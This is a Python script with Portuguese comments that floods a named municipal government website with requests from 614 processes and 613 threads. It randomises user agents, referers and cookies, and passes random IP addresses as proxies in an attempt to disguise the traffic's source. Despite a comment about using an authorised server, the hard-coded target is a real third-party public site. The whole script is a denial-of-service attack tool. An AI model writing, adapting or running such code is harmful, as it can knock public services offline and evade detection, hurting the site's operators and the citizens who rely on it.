import multiprocessing
import threading
import requests
import random
import string
from scapy.all import RandIP

def read_file_lines(filename):
    with open(filename, "r") as file:
        lines = file.readlines()
    return [line.strip() for line in lines]

def generate_random_cookie():
    cookie_name = ''.join(random.choices(string.ascii_letters, k=10))
    cookie_value = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    return {cookie_name: cookie_value}

def request_test():
    user_agents = read_file_lines("useragents.txt")
    referers = read_file_lines("referers.txt")
    
    user_agent = random.choice(user_agents)
    referer = random.choice(referers)
    spoofed_ip = str(RandIP())
    
    url = "https://www.guaruja.sp.gov.br/"  # Substitua pelo seu servidor autorizado
    headers = {
        "User-Agent": user_agent,
        "Referer": referer,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
        "Sec-GPC": "1",
        "TE": "Trailers"
    }
    cookies = generate_random_cookie()
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": spoofed_ip, "https": spoofed_ip})
    print(f"Status da requisição com {user_agent}, referer {referer}, IP spoofed {spoofed_ip} e cookies {cookies}: {response.status_code}")

if __name__ == "__main__":
    # Multiprocessing com 614 processos
    processes = []
    for _ in range(614):
        p = multiprocessing.Process(target=request_test)
        p.start()
        processes.append(p)
    
    # Threads com 613 threads
    threads = []
    for _ in range(613):
        t = threading.Thread(target=request_test)
        t.start()
        threads.append(t)
    
    try:
        # Mantém o programa rodando até ser encerrado com Control+C
        for p in processes:
            p.join()
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("Programa encerrado.")